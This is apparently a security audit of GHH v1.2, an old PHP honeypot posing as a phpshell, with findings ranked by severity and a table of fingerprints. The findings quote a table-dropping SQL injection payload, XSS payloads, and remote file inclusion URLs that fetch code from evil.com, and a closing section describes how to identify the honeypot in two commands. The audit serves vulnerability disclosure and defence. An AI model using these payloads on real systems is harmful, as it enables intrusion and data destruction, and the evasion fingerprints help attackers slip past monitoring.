# GHH (Google Hack Honeypot) v1.2 — Security Analysis

**Source:** https://ghh.sourceforge.net/ (SourceForge zip — git clone unavailable)  
**Files:** `GHHv1.2_PHPShell/config.php`, `phpshell.php`, `xml.inc`, `README.txt`  
**Type:** PHP honeypot luring Google dork attackers via fake phpshell; logs captured attacker sessions to MySQL, CSV, or XML-RPC  
**Lane:** Single comprehensive lane (4-file codebase)

---

## Summary

| Severity | Count |
|----------|-------|
| CRITICAL | 2 |
| HIGH | 5 |
| MEDIUM | 3 |
| LOW | 2 |
| INFO | 1 |

GHH is self-defeating in two compounding ways: the honeypot is non-functional due to a PHP parse error (C2), and the SQL injection path in the logging subsystem (C1) means even if it were operational, an attacker could destroy all captured data. The "fake" shell emits real outbound network connections (wget/ping) making it an SSRF pivot in any deployment where those commands are triggered. The static response corpus (fixed PID 16919, fixed kernel version, fixed dates) fingerprints GHH deterministically within 2 commands.

---

## CRITICAL

### C1 — config.php:310-311 — SQL injection via `$_POST['command']` into MySQL INSERT

`$_POST['command']` enters `$Signature[]` at `phpshell.php:150-151` with zero sanitization:

```php
if(isset($_POST['command']))
    $Signature[] = $_POST['command'];  // raw, no sanitize()
```

This value flows into `writeLog()` and is concatenated directly into the MySQL INSERT:

```php
$SigLog .= $string . ';';            // still raw
"... VALUES (... '" . $SigLog . "', ...);"
```

Every other attacker-supplied field passes through `sanitize()` (which escapes `'` to `&#39;`). The command field does not. Classic second-order injection: attacker POSTs `command='; DROP TABLE logs; --` and destroys the log table.

**Requires:** MySQL logging mode (`$LogType = 'MySQL'`).  
**Impact:** Full SQL injection on the logging database — read, modify, destroy all captured intelligence. Evidentiary integrity lost.

---

### C2 — phpshell.php:86 — Stray backslash causes PHP parse error; honeypot is non-functional

```php
$output .= runCommand($myCommand, $paramaters, $Username)."\n";\
```

The trailing `\` is syntactically invalid — PHP's tokenizer treats it as `T_NS_SEPARATOR` in an invalid context, producing a fatal parse error before any code executes. `error_reporting(0)` at line 50 suppresses runtime errors but cannot suppress parse errors.

**Impact:** `phpshell.php` does not execute at all. No attacker is logged, no commands are captured, no traps fire. The honeypot is silently broken with no indication to the operator. This is the bug class that invalidates the entire product as shipped.

---

## HIGH

### H1 — config.php:123-148 + phpshell.php:942-943 — SSRF via wget emulation; real TCP connections to attacker-controlled hosts

When `command=wget http://<attacker-url>`, `downloadHTTPfile()` calls `fsockopen($host, $port)` — a real TCP connection:

```php
$connection = fsockopen($host, $port);  // REAL TCP, no whitelist
```

No RFC1918 exclusion, no hostname whitelist, no timeout. The honeypot:
1. Resolves the attacker's domain via real DNS (usable as a DNS beacon)
2. Opens TCP/80 to the target (internal network reachable)
3. Reads up to 500KB of response
4. Base64-encodes it and transmits it to the operator's XML-RPC server

`sanitize_system_string()` is called to produce `$cleanSysURL` but its result is never used — the actual `downloadHTTPfile()` call passes the unsanitized variables directly. Dead-code sanitization.

`ping` at line 657 also calls `gethostbyname($domainip)` with unsanitized attacker input — real DNS resolution, functional as a covert channel.

**Impact:** Internal network reconnaissance via the honeypot host. The trap becomes a pivot point.

---

### H2 — phpshell.php:519,129 — Reflected XSS via textarea escape

POST `command=cat </textarea><img src=x onerror=alert(document.domain)>`:

```
$paramaters = '</textarea>...'              // phpshell.php:84-85
$output = "cat: " . $paramaters . ": ..."  // phpshell.php:519
echo $output;                               // phpshell.php:129, inside <textarea>
```

The `cat` fallthrough returns `$paramaters` verbatim into `$output` which is echoed inside a `<textarea>` with no encoding. `</textarea>` closes the tag and the subsequent payload executes. `descapeQuotes()` strips quotes but not `<`, `>`, or `/`.

**Impact:** Reflected POST XSS. XSS fires in the context of the operator's browser session if they visit the shell interface.

---

### H3 — phpshell.php:91-95,108 — Reflected XSS via REQUEST_URI in form action

```php
$ourfile = $_SERVER['REQUEST_URI'];
$question = strpos($ourfile, '?');
$ourfile = substr($ourfile, 0, $question);
// output: <form name="myform" action="{$ourfile}" method="post">
```

`$_SERVER['REQUEST_URI']` is truncated at `?` but never HTML-encoded before being placed in the `action=""` attribute. A crafted URL like `/phpshell.php"><script>alert(1)</script>` causes script execution.

**Impact:** GET-based XSS — trivially linkable, no form submission required. Steals operator session cookies.

---

### H4 — phpshell.php:32,52 — Remote File Inclusion via `$ConfigFile` (register_globals)

```php
$ConfigFile = '';
include($ConfigFile);
```

With `register_globals=ON` (PHP 4.x / early 5.x default — GHH's target era), `GET /phpshell.php?ConfigFile=http://evil.com/shell.txt` sets `$ConfigFile` and `include()` fetches and executes it as PHP. No guard exists for this variable (contrast with `$Honeypot` at config.php:87-91 which has an explicit guard).

**Impact:** Full remote code execution on the honeypot host if deployed on register_globals-era PHP.

---

### H5 — config.php:346 — SSL peer verification disabled on XML-RPC log exfil

```php
$server->setSSLVerifyPeer(false);
$responce = $server->send($XMLattack, 0, "https");
```

When `$XMLhttps = true`, SSL peer verification is disabled. MITM between the honeypot and the XML-RPC logging server intercepts all captured attacker data and the shared `$XMLmagic` token in plaintext.

---

## MEDIUM

### M1 — config.php:354 — CSV log injection via unsanitized command field

`$_POST['command']` enters `$Signature[]` unsanitized (same path as C1) then flows into CSV output without stripping commas or newlines. Attacker injects `\n[2026-01-01T00:00:00+00:00,1.2.3.4,FAKE_ENTRY]` to fabricate records or frame arbitrary IPs.

**Requires:** CSV logging mode.

---

### M2 — config.php:54,317 — `$XMLrpc` RFI (register_globals)

```php
$XMLrpc = 'xml.inc';
include($GLOBALS['XMLrpc']);
```

Same class as H4. With register_globals=ON, `GET /config.php?XMLrpc=http://evil.com/payload.php` executes arbitrary code.

---

### M3 — config.php:87-103 — Honeypot gate bypass via renamed-file register_globals injection

The guard at config.php:87-103 only unsets `$Honeypot` if `REQUEST_URI` contains `"config.php"` AND register_globals is ON. README instructs operators to rename `config.php` — when renamed to e.g. `settings.php`, this check never trips, so `?Honeypot=true` bypasses the logging gate and permits direct unauthenticated access to the config file with the full function library loaded.

---

## LOW

- **phpshell.php:302** — `$Username:x:1000:1000:,,,:/home/$Username:/bin/bas` — the `/bin/bas` typo (missing `h`) is present in every deployment and a strong static fingerprint. If the operator used their real system username, it is disclosed in fake `/etc/passwd`.
- **phpshell.php:315-334** — `/proc/cpuinfo` returns AMD Athlon XP 1800+, bogomips 3006.46 — a 2003-era CPU that no production server has run since approximately 2008. Immediately fingerprints a virtualized or honeypot environment.

---

## INFO

**RCE via the shell interface: impossible.** `runCommand()` never calls `system()`, `exec()`, `shell_exec()`, `popen()`, or `passthru()`. All output is hardcoded templates. However, wget/ping (H1) make real network connections, and RFI paths (H4, M2) allow real code execution given register_globals.

---

## Fingerprint Table — GHH v1.2 Deterministic Identifiers

| Signal | Value | Location |
|--------|-------|----------|
| `id` output | Always `uid=0(root) gid=0(root) groups=0(root)` | phpshell.php:720 |
| `ps` PID | Always 16919, never changes between requests | phpshell.php:182 |
| `ls` file count | Always exactly 3 files | phpshell.php:628-642 |
| `ls -la` dates | Always `2005-11-30 10:34` | phpshell.php:629-633 |
| `/proc/cpuinfo` | AMD Athlon XP 1800+, bogomips 3006.46 | phpshell.php:316-334 |
| `uname --nodename` | Always "debian" | phpshell.php:775 |
| `uname -r` | Always "2.6.8-2-k7" | phpshell.php:777 |
| `/etc/passwd` kernel | Debian, UID/GID layout, MySQL at 105/107, `/bin/bas` typo | phpshell.php:278-302 |
| Ping sleep | Always `sleep(~3s)` regardless of target | phpshell.php:663 |
| `cat phpshell.php` | Returns static 1999-2002 license header | phpshell.php:337-515 |
| Page title | `PHP Shell 1.7` | phpshell.php:102 |

**Bot detection in 2 commands:** `id` always returns root. `ps` returns the same PID 16919 on every request. Two observations confirm honeypot identity with certainty.
